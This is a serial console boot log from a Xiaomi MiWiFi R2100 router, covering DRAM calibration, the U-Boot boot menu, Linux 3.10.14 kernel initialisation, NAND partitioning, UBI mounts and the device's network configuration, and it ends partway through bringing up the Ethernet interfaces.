1.0-15 bit dq delay value
==================================================================
bit|     0  1  2  3  4  5  6  7  8  9
--------------------------------------
0 |    7 7 7 8 5 7 7 7 2 4 
10 |    5 6 6 6 5 6 
--------------------------------------

==================================================================
2.dqs window
x=pass dqs delay value (min~max)center 
y=0-7bit DQ of every group
input delay:DQS0 =30 DQS1 = 29
==================================================================
bit	DQS0	 bit      DQS1
0  (1~58)29  8  (1~56)28
1  (1~58)29  9  (1~56)28
2  (1~58)29  10  (1~58)29
3  (1~60)30  11  (1~54)27
4  (1~57)29  12  (1~58)29
5  (1~58)29  13  (1~55)28
6  (1~58)29  14  (1~56)28
7  (1~60)30  15  (1~57)29
==================================================================
3.dq delay value last
==================================================================
bit|    0  1  2  3  4  5  6  7  8   9
--------------------------------------
0 |    8 8 8 8 6 8 8 7 3 5 
10 |    5 8 6 7 6 6 
==================================================================
==================================================================
     TX  perbyte calibration 
==================================================================
DQS loop = 15, cmp_err_1 = ffffa045 
DQS loop = 14, cmp_err_1 = ffff0001 
dqs_perbyte_dly.last_dqsdly_pass[1]=14,  finish count=1 
DQS loop = 13, cmp_err_1 = ffff0000 
dqs_perbyte_dly.last_dqsdly_pass[0]=13,  finish count=2 
DQ loop=15, cmp_err_1 = ffff0000
dqs_perbyte_dly.last_dqdly_pass[0]=15,  finish count=1 
dqs_perbyte_dly.last_dqdly_pass[1]=15,  finish count=2 
byte:0, (DQS,DQ)=(8,9)
byte:1, (DQS,DQ)=(8,8)
DRAMC_DQODLY1[200]=99999999
DRAMC_DQODLY2[204]=88888888
20,data:88
[EMI] DRAMC calibration passed

===================================================================
     		MT7621   stage1 code done 
     		CPU=50000000 HZ BUS=16666666 HZ
===================================================================


U-Boot 1.1.3 (Aug 26 2019 - 12:47:18)

Board: Ralink APSoC DRAM:  128 MB
Power on memory test. Memory size= 128 MB...OK!
relocate_code Pointer at: 87fa4000

Config XHCI 40M PLL 
Allocate 16 byte aligned buffer: 87fe0130
Enable NFI Clock
# MTK NAND # : Use HW ECC
NAND ID [C8 D1 80 95 40]
Device found in MTK table, ID: c8d1, EXT_ID: 809540
Support this Device in MTK table! c8d1 
select_chip
[NAND]select ecc bit:4, sparesize :64 spare_per_sector=16
Signature matched and data read!
load_fact_bbt success 1023
load fact bbt success
[mtk_nand] probe successfully!
mtd->writesize=2048 mtd->oobsize=64,	mtd->erasesize=131072  devinfo.iowidth=8
..============================================ 
Ralink UBoot Version: 5.0.0.0
-------------------------------------------- 
ASIC MT7621A DualCore (MAC to MT7530 Mode)
DRAM_CONF_FROM: Auto-Detection 
DRAM_TYPE: DDR3 
DRAM bus: 16 bit
Xtal Mode=3 OCP Ratio=1/3
Flash component: NAND Flash
Date:Aug 26 2019  Time:12:47:18
============================================ 
icache: sets:256, ways:4, linesz:32 ,total:32768
dcache: sets:256, ways:4, linesz:32 ,total:32768 

 ##### The CPU freq = 880 MHZ #### 
 estimate memory size =128 Mbytes
#Reset_MT7530
set LAN/WAN WLLLL

Please choose the operation: 
   1: Load system code to SDRAM via TFTP. 
   2: Load system code then write to Flash via TFTP. 
   3: Boot system code via Flash (default).
   4: Entr boot command line interface.
   7: Load Boot Loader code then write to Flash via Serial. 
   9: Load Boot Loader code then write to Flash via TFTP. 

Booting System 2
..ranand_erase: start:80000, len:20000 
..Done!
done
   
3: System Boot system code via Flash.
## Booting image at bc600000 ...
   Image Name:   MIPS OpenWrt Linux-3.10.14
   Image Type:   MIPS Linux Kernel Image (lzma compressed)
   Data Size:    3391601 Bytes =  3.2 MB
   Load Address: 81001000
   Entry Point:  81436420
....................................................   Verifying Checksum ... OK
   Uncompressing Kernel Image ... OK
commandline uart_en=0 factory_mode=0
No initrd
## Transferring control to Linux (at address 81436420) ...
## Giving linux memsize in MB, 128

Starting kernel ...


LINUX started...

 THIS IS ASIC

SDK 5.0.S.0
[    0.000000] Initializing cgroup subsys cpuset
[    0.000000] Initializing cgroup subsys cpu
[    0.000000] Linux version 3.10.14 (jenkins@2c09a128d08d) (gcc version 4.8.5 (crosstool-NG crosstool-ng-1.22.0) ) #1 MiWiFi-R2100-2.0.376 SMP Fri Nov 22 06:40:19 UTC 2019
[    0.000000] 
[    0.000000]  The CPU feqenuce set to 880 MHz
[    0.000000] GCMP present
[    0.000000] CPU0 revision is: 0001992f (MIPS 1004Kc)
[    0.000000] Software DMA cache coherency
[    0.000000] Determined physical RAM map:
[    0.000000]  memory: 08000000 @ 00000000 (usable)
[    0.000000] Initrd not found or empty - disabling initrd
[    0.000000] Zone ranges:
[    0.000000]   DMA      [mem 0x00000000-0x00ffffff]
[    0.000000]   Normal   [mem 0x01000000-0x07ffffff]
[    0.000000] Movable zone start for each node
[    0.000000] Early memory node ranges
[    0.000000]   node   0: [mem 0x00000000-0x07ffffff]
[    0.000000] Detected 3 available secondary CPU(s)
[    0.000000] Primary instruction cache 32kB, 4-way, VIPT, linesize 32 bytes.
[    0.000000] Primary data cache 32kB, 4-way, PIPT, no aliases, linesize 32 bytes
[    0.000000] MIPS secondary cache 256kB, 8-way, linesize 32 bytes.
[    0.000000] PERCPU: Embedded 7 pages/cpu @81843000 s6912 r8192 d13568 u32768
[    0.000000] Built 1 zonelists in Zone order, mobility grouping on.  Total pages: 32512
[    0.000000] Kernel command line: console=ttyS1,115200n8 root=/dev/mtdblock5 uart_en=0 factory_mode=0
[    0.000000] PID hash table entries: 512 (order: -1, 2048 bytes)
[    0.000000] Dentry cache hash table entries: 16384 (order: 4, 65536 bytes)
[    0.000000] Inode-cache hash table entries: 8192 (order: 3, 32768 bytes)
[    0.000000] Writing ErrCtl register=0000e826
[    0.000000] Readback ErrCtl register=0000e826
[    0.000000] allocated 262144 bytes of page_cgroup
[    0.000000] please try 'cgroup_disable=memory' option if you don't want memory cgroups
[    0.000000] Memory: 122132k/131072k available (4358k kernel code, 8940k reserved, 1134k data, 1604k init, 0k highmem)
[    0.000000] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=4, Nodes=1
[    0.000000] Hierarchical RCU implementation.
[    0.000000] NR_IRQS:128
[    0.000000] console [ttyS1] enabled
[    0.130000] Calibrating delay loop... 577.53 BogoMIPS (lpj=2887680)
[    0.190000] pid_max: default: 32768 minimum: 301
[    0.190000] Mount-cache hash table entries: 512
[    0.200000] Initializing cgroup subsys memory
[    0.200000] launch: starting cpu1
[    0.210000] launch: cpu1 gone!
[    0.210000] CPU1 revision is: 0001992f (MIPS 1004Kc)
[    0.210000] Primary instruction cache 32kB, 4-way, VIPT, linesize 32 bytes.
[    0.210000] Primary data cache 32kB, 4-way, PIPT, no aliases, linesize 32 bytes
[    0.210000] MIPS secondary cache 256kB, 8-way, linesize 32 bytes.
[    0.270000] Synchronize counters for CPU 1: done.
[    0.280000] launch: starting cpu2
[    0.280000] launch: cpu2 gone!
[    0.280000] CPU2 revision is: 0001992f (MIPS 1004Kc)
[    0.280000] Primary instruction cache 32kB, 4-way, VIPT, linesize 32 bytes.
[    0.280000] Primary data cache 32kB, 4-way, PIPT, no aliases, linesize 32 bytes
[    0.280000] MIPS secondary cache 256kB, 8-way, linesize 32 bytes.
[    0.340000] Synchronize counters for CPU 2: done.
[    0.350000] launch: starting cpu3
[    0.350000] launch: cpu3 gone!
[    0.350000] CPU3 revision is: 0001992f (MIPS 1004Kc)
[    0.350000] Primary instruction cache 32kB, 4-way, VIPT, linesize 32 bytes.
[    0.350000] Primary data cache 32kB, 4-way, PIPT, no aliases, linesize 32 bytes
[    0.350000] MIPS secondary cache 256kB, 8-way, linesize 32 bytes.
[    0.410000] Synchronize counters for CPU 3: done.
[    0.420000] Brought up 4 CPUs
[    0.420000] devtmpfs: initialized
[    0.420000] NET: Registered protocol family 16
[    0.660000] release PCIe RST: RALINK_RSTCTRL = 7000000
[    0.660000] PCIE PHY initialize
[    0.660000] ***** Xtal 40MHz *****
[    0.670000] start MT7621 PCIe register access
[    1.120000] RALINK_RSTCTRL = 7000000
[    1.130000] RALINK_CLKCFG1 = 73ffeff8
[    1.130000] 
[    1.130000] *************** MT7621 PCIe RC mode *************
[    1.510000] pcie_link status = 0x3
[    1.510000] RALINK_RSTCTRL= 7000000
[    1.520000] *** Configure Device number setting of Virtual PCI-PCI bridge ***
[    1.530000] RALINK_PCI_PCICFG_ADDR = 21007f2 -> 21007f2
[    1.530000] PCIE0 enabled
[    1.530000] PCIE1 enabled
[    1.540000] interrupt enable status: 300000
[    1.540000] Port 1 N_FTS = 1b105000
[    1.540000] Port 0 N_FTS = 1b105000
[    1.550000] config reg done
[    1.550000] init_rt2880pci done
[    1.570000] bio: create slab <bio-0> at 0
[    1.580000] SCSI subsystem initialized
[    1.580000] PCI host bridge to bus 0000:00
[    1.590000] pci_bus 0000:00: root bus resource [mem 0x60000000-0x6fffffff]
[    1.600000] pci_bus 0000:00: root bus resource [io  0x1e160000-0x1e16ffff]
[    1.600000] pci_bus 0000:00: No busn resource found for root bus, will use [bus 00-ff]
[    1.610000] pci 0000:00:00.0: bridge configuration invalid ([bus 00-00]), reconfiguring
[    1.620000] pci 0000:00:01.0: bridge configuration invalid ([bus 00-00]), reconfiguring
[    1.630000] pci 0000:00:00.0: BAR 0: can't assign mem (size 0x80000000)
[    1.630000] pci 0000:00:01.0: BAR 0: can't assign mem (size 0x80000000)
[    1.640000] pci 0000:00:00.0: BAR 8: assigned [mem 0x60000000-0x600fffff]
[    1.650000] pci 0000:00:01.0: BAR 8: assigned [mem 0x60100000-0x601fffff]
[    1.650000] pci 0000:00:00.0: BAR 1: assigned [mem 0x60200000-0x6020ffff]
[    1.660000] pci 0000:00:01.0: BAR 1: assigned [mem 0x60210000-0x6021ffff]
[    1.670000] pci 0000:01:00.0: BAR 0: assigned [mem 0x60000000-0x600fffff 64bit]
[    1.680000] pci 0000:00:00.0: PCI bridge to [bus 01]
[    1.680000] pci 0000:00:00.0:   bridge window [mem 0x60000000-0x600fffff]
[    1.690000] pci 0000:02:00.0: BAR 0: assigned [mem 0x60100000-0x601fffff]
[    1.690000] pci 0000:00:01.0: PCI bridge to [bus 02]
[    1.700000] pci 0000:00:01.0:   bridge window [mem 0x60100000-0x601fffff]
[    1.710000] PCI: Enabling device 0000:00:00.0 (0004 -> 0006)
[    1.710000] PCI: Enabling device 0000:00:01.0 (0004 -> 0006)
[    1.720000] BAR0 at slot 0 = 0
[    1.720000] bus=0x0, slot = 0x0
[    1.720000] res[0]->start = 0
[    1.730000] res[0]->end = 0
[    1.730000] res[1]->start = 60200000
[    1.730000] res[1]->end = 6020ffff
[    1.740000] res[2]->start = 0
[    1.740000] res[2]->end = 0
[    1.740000] res[3]->start = 0
[    1.740000] res[3]->end = 0
[    1.750000] res[4]->start = 0
[    1.750000] res[4]->end = 0
[    1.750000] res[5]->start = 0
[    1.760000] res[5]->end = 0
[    1.760000] BAR0 at slot 1 = 0
[    1.760000] bus=0x0, slot = 0x1
[    1.760000] res[0]->start = 0
[    1.770000] res[0]->end = 0
[    1.770000] res[1]->start = 60210000
[    1.770000] res[1]->end = 6021ffff
[    1.780000] res[2]->start = 0
[    1.780000] res[2]->end = 0
[    1.780000] res[3]->start = 0
[    1.790000] res[3]->end = 0
[    1.790000] res[4]->start = 0
[    1.790000] res[4]->end = 0
[    1.790000] res[5]->start = 0
[    1.800000] res[5]->end = 0
[    1.800000] bus=0x1, slot = 0x0, irq=0x4
[    1.800000] res[0]->start = 60000000
[    1.810000] res[0]->end = 600fffff
[    1.810000] res[1]->start = 0
[    1.810000] res[1]->end = 0
[    1.820000] res[2]->start = 0
[    1.820000] res[2]->end = 0
[    1.820000] res[3]->start = 0
[    1.830000] res[3]->end = 0
[    1.830000] res[4]->start = 0
[    1.830000] res[4]->end = 0
[    1.830000] res[5]->start = 0
[    1.840000] res[5]->end = 0
[    1.840000] bus=0x2, slot = 0x1, irq=0x18
[    1.840000] res[0]->start = 60100000
[    1.850000] res[0]->end = 601fffff
[    1.850000] res[1]->start = 0
[    1.850000] res[1]->end = 0
[    1.860000] res[2]->start = 0
[    1.860000] res[2]->end = 0
[    1.860000] res[3]->start = 0
[    1.870000] res[3]->end = 0
[    1.870000] res[4]->start = 0
[    1.870000] res[4]->end = 0
[    1.870000] res[5]->start = 0
[    1.880000] res[5]->end = 0
[    1.880000] Switching to clocksource MIPS
[    1.890000] cfg80211: Calling CRDA to update world regulatory domain
[    1.890000] NET: Registered protocol family 2
[    1.890000] TCP established hash table entries: 1024 (order: 1, 8192 bytes)
[    1.890000] TCP bind hash table entries: 1024 (order: 1, 8192 bytes)
[    1.890000] TCP: Hash tables configured (established 1024 bind 1024)
[    1.890000] TCP: reno registered
[    1.890000] UDP hash table entries: 256 (order: 1, 8192 bytes)
[    1.890000] UDP-Lite hash table entries: 256 (order: 1, 8192 bytes)
[    1.890000] NET: Registered protocol family 1
[    2.970000] 4 CPUs re-calibrate udelay(lpj = 2924544)
[    3.000000] squashfs: version 4.0 (2009/01/31) Phillip Lougher
[    3.000000] msgmni has been set to 238
[    3.010000] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 253)
[    3.010000] io scheduler noop registered (default)
[    3.020000] MIWIFI panic notifier registeredreg_int_mask=0, INT_MASK= 0 
[    3.030000] HSDMA_init
[    3.030000] 
[    3.030000]  hsdma_phy_tx_ring0 = 0x00c00000, hsdma_tx_ring0 = 0xa0c00000
[    3.040000] 
[    3.040000]  hsdma_phy_rx_ring0 = 0x00c04000, hsdma_rx_ring0 = 0xa0c04000
[    3.050000] TX_CTX_IDX0 = 0
[    3.050000] TX_DTX_IDX0 = 0
[    3.050000] RX_CRX_IDX0 = 3ff
[    3.050000] RX_DRX_IDX0 = 0
[    3.060000] set_fe_HSDMA_glo_cfg
[    3.060000] HSDMA_GLO_CFG = 465
[    3.060000] Serial: 8250/16550 driver, 2 ports, IRQ sharing disabled
[    3.070000] serial8250: ttyS0 at MMIO 0x1e000d00 (irq = 27) is a 16550A
[    3.080000] serial8250: ttyS1 at MMIO 0x1e000c00 (irq = 26) is a 16550A
[    3.090000] Ralink gpio driver initialized
[    3.090000] brd: module loaded
[    3.090000] MediaTek Nand driver init, version v2.1 Fix AHB virt2phys error
[    3.100000] Allocate 16 byte aligned buffer: 81720500
[    3.110000] Enable NFI Clock
[    3.110000] # MTK NAND # : Use HW ECC
[    3.110000] NAND ID [C8 D1 80 95 40, 00809540]
[    3.120000] NAND ECC: Controller
[    3.120000] Device found in MTK table, ID: c8d1, EXT_ID: 809540
[    3.130000] Support this Device in MTK table! c8d1 
[    3.130000] NAND device: Manufacturer ID: 0xc8, Chip ID: 0xd1 (ESMT NAND 128MiB 3,3V 8-bit), 128MiB, page size: 2048, OOB size: 64
[    3.140000] [NAND]select ecc bit:4, sparesize :64 spare_per_sector=16
[    3.150000] Scanning device for bad blocks
[    3.300000] Signature matched and data read!
[    3.300000] load_fact_bbt success 1023
[    3.310000] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
[    3.310000] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
[    3.320000] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
[    3.330000] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
[    3.340000] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
[    3.350000] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
[    3.360000] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
[    3.370000] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
[    3.380000] Creating 14 MTD partitions on "MT7621-NAND":
[    3.390000] 0x000000000000-0x000007f80000 : "ALL"
[    3.400000] 0x000000000000-0x000000080000 : "Bootloader"
[    3.400000] 0x000000080000-0x0000000c0000 : "Config"
[    3.410000] 0x0000000c0000-0x000000100000 : "Bdata"
[    3.410000] 0x000000100000-0x000000140000 : "Factory"
[    3.420000] 0x000000140000-0x000000180000 : "crash"
[    3.430000] 0x000000180000-0x0000001c0000 : "crash_syslog"
[    3.430000] 0x0000001c0000-0x000000200000 : "cfg_bak"
[    3.440000] 0x000000200000-0x000000600000 : "kernel0"
[    3.450000] 0x000000600000-0x000000a00000 : "kernel1"
[    3.450000] 0x000000a00000-0x000002400000 : "rootfs0"
[    3.460000] 0x000002400000-0x000003e00000 : "rootfs1"
[    3.470000] 0x000003e00000-0x000006400000 : "overlay"
[    3.470000] 0x000006400000-0x000007f80000 : "obr"
[    3.480000] [mtk_nand] probe successfully!
[    3.480000] tun: Universal TUN/TAP device driver, 1.6
[    3.490000] tun: (C) 1999-2004 Max Krasnyansky <maxk@qualcomm.com>
[    3.500000] PPP generic driver version 2.4.2
[    3.500000] PPP BSD Compression module registered
[    3.500000] PPP Deflate Compression module registered
[    3.510000] PPP MPPE Compression module registered
[    3.510000] NET: Registered protocol family 24
[    3.520000] PPTP driver version 0.8.5
[    3.520000] ps: can't get major 253
[    3.530000] GMAC1_MAC_ADRH -- : 0x000050d2
[    3.530000] GMAC1_MAC_ADRL -- : 0xf56c61e2
[    3.540000] Ralink APSoC Ethernet Driver Initilization. v3.1  1024 rx/tx descriptors allocated, mtu = 1500!
[    3.540000] GMAC1_MAC_ADRH -- : 0x000050d2
[    3.550000] GMAC1_MAC_ADRL -- : 0xf56c61e2
[    3.550000] PROC INIT OK!
[    3.560000] softdog: Software Watchdog Timer: 0.08 initialized. soft_noboot=0 soft_margin=60 sec soft_panic=0 (nowayout=0)
[    3.570000] Netfilter messages via NETLINK v0.30.
[    3.570000] nfnl_acct: registering with nfnetlink.
[    3.580000] nf_conntrack version 0.5.0 (1908 buckets, 7632 max)
[    3.590000] gre: GRE over IPv4 demultiplexor driver
[    3.590000] ip_tables: (C) 2000-2006 Netfilter Core Team
[    3.600000] Type=Restricted Cone
[    3.600000] TCP: cubic registered
[    3.600000] NET: Registered protocol family 10
[    3.610000] ip6_tables: (C) 2000-2006 Netfilter Core Team
[    3.610000] NET: Registered protocol family 17
[    3.620000] l2tp_core: L2TP core driver, V2.0
[    3.620000] l2tp_ppp: PPPoL2TP kernel driver, V2.0
[    3.630000] l2tp_netlink: L2TP netlink interface
[    3.630000] 8021q: 802.1Q VLAN Support v1.8
[    3.640000] Failed to lock mtd reserved0
[    3.640000] FLASH ID: [C8 D1 80 95 40] 
[    3.650000] MIQEF register done
[    3.660000] Freeing unused kernel memory: 1604K (8155f000 - 816f0000)
[    3.660000] csd: CSD deadlock debugging initiated!
[    3.720000] Loading essential drivers...
[    3.730000] Press Ctrl+C to enter RAMFS...
[    4.760000] Bringup the system...
[    4.780000] flag_boot_rootfs=1 mounting /dev/mtd11
[    4.790000] UBI: attaching mtd11 to ubi0
[    5.030000] UBI: scanning is finished
[    5.050000] UBI: attached mtd11 (name "rootfs1", size 26 MiB) to ubi0
[    5.060000] UBI: PEB size: 131072 bytes (128 KiB), LEB size: 126976 bytes
[    5.060000] UBI: min./max. I/O unit sizes: 2048/2048, sub-page size 2048
[    5.070000] UBI: VID header offset: 2048 (aligned 2048), data offset: 4096
[    5.080000] UBI: good PEBs: 208, bad PEBs: 0, corrupted PEBs: 0
[    5.080000] UBI: user volume: 1, internal volumes: 1, max. volumes count: 128
[    5.090000] UBI: max/mean erase counter: 1/1, WL threshold: 4096, image sequence number: 807832724
[    5.100000] UBI: available PEBs: 81, total reserved PEBs: 127, PEBs reserved for bad PEB handling: 20
[    5.110000] UBI: background thread "ubi_bgt0d" started, PID 364
UBI device number 0, total 208 LEBs (26411008 bytes, 25.2 MiB), available 81 LEBs (10285056 bytes, 9.8 MiB), LEB size 126976 bytes (124.0 KiB)
config core 'version'
	# ROM ver
	option ROM '2.0.376'
	# channel
	option CHANNEL 'release'
	# hardware platform R1AC or R1N etc.
	option HARDWARE 'R2100'
	# CFE ver
	option UBOOT '1.0.2'
	# Linux Kernel ver
	option LINUX '0.0.1'
	# RAMFS ver
	option RAMFS '0.0.1'
	# SQUASHFS ver
	option SQAFS '0.0.1'
	# ROOTFS ver
	option ROOTFS '0.0.1'
	#build time
	option BUILDTIME 'Fri, 22 Nov 2019 06:30:23 +0000'
	#build timestamp
	option BUILDTS '1574404223'
	#build git tag
	option GTAG 'commit cacc861425b58050764f18d2b33f39b3044ae9cf'
mount: mounting proc on /proc failed: Device or resource busy
mount: mounting sysfs on /sys failed: Device or resource busy
[    6.280000] 50:FFFFFFD2:FFFFFFF5:6C:61:FFFFFFE2
[    6.280000] Raeth v3.1 (Tasklet,SkbRecycle)
[    6.290000] set CLK_CFG_0 = 0x40a00020!!!!!!!!!!!!!!!!!!1
[    6.300000] phy_free_head is 0xc08000!!!
[    6.300000] phy_free_tail_phy is 0xc09ff0!!!
[    6.310000] txd_pool=a0c10000 phy_txd_pool=00C10000
[    6.310000] ei_local->skb_free start address is 0x877426dc.
[    6.320000] free_txd: 00c10010, ei_local->cpu_ptr: 00C10000
[    6.320000]  POOL  HEAD_PTR | DMA_PTR | CPU_PTR 
[    6.330000] ----------------+---------+--------
[    6.330000]      0xa0c10000 0x00C10000 0x00C10000
[    6.340000] 
[    6.340000] phy_qrx_ring = 0x00c0a000, qrx_ring = 0xa0c0a000
[    6.340000] 
[    6.340000] phy_rx_ring0 = 0x00c0c000, rx_ring0 = 0xa0c0c000
[    6.370000] MT7530 Reset Completed!!
[    6.380000] change HW-TRAP to 0x117c8f
[    6.390000] set LAN/WAN WLLLL
[    6.390000] GMAC1_MAC_ADRH -- : 0x000050d2
[    6.400000] GMAC1_MAC_ADRL -- : 0xf56c61e2
[    6.400000] GDMA2_MAC_ADRH -- : 0x000050d2
[    6.410000] GDMA2_MAC_ADRL -- : 0xf56c61e1
[    6.410000] eth1: ===> VirtualIF_open
[    6.420000] MT7621 GE2 link rate to 1G
[    6.420000] CDMA_CSG_CFG = 81000000
[    6.420000] GDMA1_FWD_CFG = 20710000
[    6.430000] GDMA2_FWD_CFG = 20710000
- preinit -
Fri Nov 22 06:40:19 UTC 2019
- regular preinit -
/lib/preinit.sh: line 1: pi_indicate_led: not found
[    6.650000] UBI: attaching mtd12 to ubi1
[    7.000000] UBI: scanning is finished
[    7.020000] UBI: attached mtd12 (name "overlay", size 38 MiB) to ubi1
[    7.030000] UBI: PEB size: 131072 bytes (128 KiB), LEB size: 126976 bytes
[    7.030000] UBI: min./max. I/O unit sizes: 2048/2048, sub-page size 2048
[    7.040000] UBI: VID header offset: 2048 (aligned 2048), data offset: 4096
[    7.050000] UBI: good PEBs: 304, bad PEBs: 0, corrupted PEBs: 0
[    7.050000] UBI: user volume: 1, internal volumes: 1, max. volumes count: 128
[    7.060000] UBI: max/mean erase counter: 32/16, WL threshold: 4096, image sequence number: 252890804
[    7.070000] UBI: available PEBs: 0, total reserved PEBs: 304, PEBs reserved for bad PEB handling: 20
[    7.080000] UBI: background thread "ubi_bgt1d" started, PID 563
UBI device number 1, total 304 LEBs (38600704 bytes, 36.8 MiB), available 0 LEBs[    7.090000] UBIFS: background thread "ubifs_bgt1_0" started, PID 567
 (0 bytes), LEB size 126976 bytes (124.0 KiB)
[    7.160000] UBIFS: recovery needed
[    7.370000] UBIFS: recovery completed
[    7.370000] UBIFS: mounted UBI device 1, volume 0, name "data"
[    7.380000] UBIFS: LEB size: 126976 bytes (124 KiB), min./max. I/O unit sizes: 2048 bytes/2048 bytes
[    7.390000] UBIFS: FS size: 34283520 bytes (32 MiB, 270 LEBs), journal size 1777664 bytes (1 MiB, 14 LEBs)
[    7.400000] UBIFS: reserved for root: 1619295 bytes (1581 KiB)
[    7.400000] UBIFS: media format: w4/r0 (latest is w4/r0), UUID 30448931-43D9-42D3-B005-D3D8D8DC40FD, small LPT model
/lib/preinit.sh: line 1: jffs2_not_mounted: not found
- init -
[    8.560000] ra2880stop()...Done
[    8.560000] eth1: ===> VirtualIF_close
[    8.570000] Free TX/RX Ring Memory!
init started: BusyBox v1.19.4 (2019-11-22 06:27:46 UTC)

Please press Enter to activate this console. rcS S boot: INFO: rc script run time limit to 65 seconds.
[    8.820000] MIWIFI crash syslog initialized
[    9.720000] Mirror/redirect action on
[    9.740000] u32 classifier
[    9.750000]     input device check on
[    9.750000]     Actions configured
[    9.910000] xt_time: kernel timezone is +0800
[   10.180000] ip_set: protocol 6
[   10.250000] ctnetlink v0.93: registering with nfnetlink.
[   10.270000] ipaccount: ifname [lo] event[5]
[   10.270000] ipaccount: ifname [ifb0] event[5]
[   10.280000] ipaccount: ifname [eth0] event[5]
[   10.280000] ipaccount: ifname [eth1] event[5]
[   10.340000] dev_redirect OFF.dev_redirect load success. 
[   10.880000] <-- RTMPAllocTxRxRingMemory, Status=0, ErrorValue=0x
[   10.880000] <-- RTMPAllocAdapterBlock, Status=0
[   10.890000] ipaccount: ifname [wl1] event[16]
[   10.890000] ipaccount: ifname [wl1] event[5]
[   12.180000] 
[   12.180000] == pAd = c1481000, size = 4194304, Status=0 ==
[   12.190000] RTMPInitPCIeDevice():device_id=0x7615
[   12.190000] mt_pci_chip_cfg(): HWVer=0x8a10, FWVer=0x8a10, pAd->ChipID=0x7615
[   12.200000] mt_pci_chip_cfg(): HIF_SYS_REV=0x76150001
[   12.210000] AP Driver version-5.0.4.0
[   12.210000] RtmpChipOpsHook(223): Not support for HIF_MT yet! MACVersion=0x0
[   12.220000] mt7615_init()-->
[   12.220000] Use 1st ePAeLNA default bin.
[   12.220000] Use 0st /etc_ro/wlan/MT7615E_EEPROM1.bin default bin.
[   12.230000] <--mt7615_init()
[   12.230000] <-- RTMPAllocTxRxRingMemory, Status=0
[   12.240000] ipaccount: ifname [wl0] event[16]
[   12.240000] ipaccount: ifname [wl0] event[5]
[   12.480000] led=10, on=1, off=4000, blinks,=1, reset=1, time=1
[   12.500000] led=12, on=1, off=4000, blinks,=1, reset=1, time=1
[   12.510000] led=10, on=4000, off=1, blinks,=1, reset=1, time=1
Fri Nov 22 07:40:25 CST 2019 netconfig[891]: INFO: loading exist /etc/config/network.
Fri Nov 22 07:40:25 CST 2019 netconfig[891]: config interface 'loopback'
Fri Nov 22 07:40:25 CST 2019 netconfig[891]: option ifname 'lo'
Fri Nov 22 07:40:25 CST 2019 netconfig[891]: option proto 'static'
Fri Nov 22 07:40:25 CST 2019 netconfig[891]: option ipaddr '127.0.0.1'
Fri Nov 22 07:40:25 CST 2019 netconfig[891]: option netmask '255.0.0.0'
Fri Nov 22 07:40:25 CST 2019 netconfig[891]: config interface 'lan'
Fri Nov 22 07:40:25 CST 2019 netconfig[891]: option ifname 'eth0'
Fri Nov 22 07:40:25 CST 2019 netconfig[891]: option type 'bridge'
Fri Nov 22 07:40:25 CST 2019 netconfig[891]: option proto 'static'
Fri Nov 22 07:40:25 CST 2019 netconfig[891]: option ipaddr '192.168.31.1'
Fri Nov 22 07:40:25 CST 2019 netconfig[891]: option netmask '255.255.255.0'
Fri Nov 22 07:40:25 CST 2019 netconfig[891]: config interface 'wan'
Fri Nov 22 07:40:25 CST 2019 netconfig[891]: option ifname 'eth1'
Fri Nov 22 07:40:25 CST 2019 netconfig[891]: option proto 'dhcp'
Fri Nov 22 07:40:25 CST 2019 netconfig[891]: config interface 'ifb'
Fri Nov 22 07:40:25 CST 2019 netconfig[891]: option ifname 'ifb0'
Fri Nov 22 07:40:25 CST 2019 netconfig[891]: config interface 'ready'
Fri Nov 22 07:40:25 CST 2019 netconfig[891]: option proto 'static'
Fri Nov 22 07:40:25 CST 2019 netconfig[891]: option ipaddr '169.254.29.1'
Fri Nov 22 07:40:25 CST 2019 netconfig[891]: option netmask '255.255.255.0'
Fri Nov 22 07:40:25 CST 2019 netconfig[891]: config interface 'openvpn'
Fri Nov 22 07:40:25 CST 2019 netconfig[891]: option ifname 'tun0'
Fri Nov 22 07:40:25 CST 2019 netconfig[891]: option proto 'openvpn'
[   20.870000] ipaccount: ifname [br-lan] event[16]
[   20.880000] ipaccount: ifname [br-lan] event[5]
[   20.890000] ipaccount: ifname [eth0] event[13]
[   20.890000] 50:FFFFFFD2:FFFFFFF5:6C:61:FFFFFFE2
[   20.900000] Raeth v3.1 (Tasklet,SkbRecycle)
[   20.900000] set CLK_CFG_0 = 0x40a00020!!!!!!!!!!!!!!!!!!1
[   20.910000] phy_free_head is 0xc2c000!!!
[   20.920000] phy_free_tail_phy is 0xc2dff0!!!
[   20.920000] txd_pool=a0c30000 phy_txd_pool=00C30000
[   20.930000] ei_local->skb_free start address is 0x877426dc.
[   20.930000] free_txd: 00c30010, ei_local->cpu_ptr: 00C30000
[   20.940000]  POOL  HEAD_PTR | DMA_PTR | CPU_PTR 
[   20.940000] ----------------+---------+--------
[   20.950000]      0xa0c30000 0x00C30000 0x00C30000
[   20.950000] 
[   20.950000] phy_qrx_ring = 0x00c2e000, qrx_ring = 0xa0c2e000
[   20.960000] 
[   20.960000] phy_rx_ring0 = 0x00c38000, rx_ring0 = 0xa0c38000
[   20.990000] MT7530 Reset Completed!!
[   21.000000] change HW-TRAP to 0x117c8f
[   21.000000] set LAN/WAN WLLLL
[   21.010000] GMAC1_MAC_ADRH -- : 0x000050d2
[   21.010000] GMAC1_MAC_ADRL -- : 0xf56c61e2
[   21.020000] eth1: ===> VirtualIF_open
[   21.020000] MT7621 GE2 link rate to 1G
[   21.020000] CDMA_CSG_CFG = 81000000
[   21.020000] GDMA1_FWD_CFG = 20710000
